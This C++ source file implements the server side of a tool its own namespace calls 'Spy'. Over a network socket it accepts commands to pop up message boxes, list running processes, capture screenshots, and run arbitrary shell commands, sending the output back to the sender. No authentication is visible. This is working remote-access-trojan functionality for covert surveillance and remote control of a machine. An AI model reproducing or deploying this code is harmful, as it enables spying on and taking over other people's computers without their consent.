#include <iostream>
#include <sstream>
#include <map>

#include "proto.hh"
#include "../Net.hh"
#include "MsgBox.hh"
#include "Process.hh"
#include "ScreenShot.hh"
#include "Cmd.hh"

using namespace std;

namespace Spy {
  class session_on_spy : public Serv_session {
  public:
    session_on_spy(int socket) : Serv_session(socket) {
      proto = new proto_observer(socket);
      (*proto)["info"].sig_recv.connect(boost::bind(&session_on_spy::do_info, this, _1));
      (*proto)["warning"].sig_recv.connect(boost::bind(&session_on_spy::do_warning, this, _1));
      (*proto)["get_list_proc"].sig_recv.connect(boost::bind(&session_on_spy::do_get_list_proc, this, _1));
      (*proto)["get_screenshot"].sig_recv.connect(boost::bind(&session_on_spy::do_get_screenshot, this, _1));
      (*proto)["send_cmd"].sig_recv.connect(boost::bind(&session_on_spy::do_send_cmd, this, _1));
    }

    void do_info(string msg) {
      MsgBox::info(msg);
    }

    void do_warning(string msg) {
      MsgBox::warning(msg);
    }
    
    void do_get_list_proc(string) {
      Process proc;
      map<int, string> m = proc.get_list_process();
      stringstream ss;
      
      cout << "taille : " << m.size() << endl;
      for(auto it : m) {
	ss << it.first << " " << it.second << " ";
      }
      
      ss << "//end//";
      (*proto)["list_proc"](ss.str());
    }
    
    void do_get_screenshot(string data) {
      stringstream ss;
      ss << data;
      double zoom;
      ss >> zoom;
      ScreenShot sc;
      int w, h;
      sc.save("test.bmp", zoom);
      //sc.get_stringstream("test.bmp", ss, w, h);
      ss << " //end//";
      //(*proto)["screenshot"](ss.str(), w, h);
    }

    void do_send_cmd(string _cmd) {
      Cmd cmd;
      cout << "cmd : " << _cmd << endl;
      cmd.exec(_cmd.c_str());
      stringstream ss(cmd.get_res());
      ss << " //end//";
      (*proto)["res_cmd"](ss.str());
    }

  };
};

int main(int argc, char** argv) {
  Server <Spy::session_on_spy> serv(argc, argv);
  serv.start();
  serv.join();
}
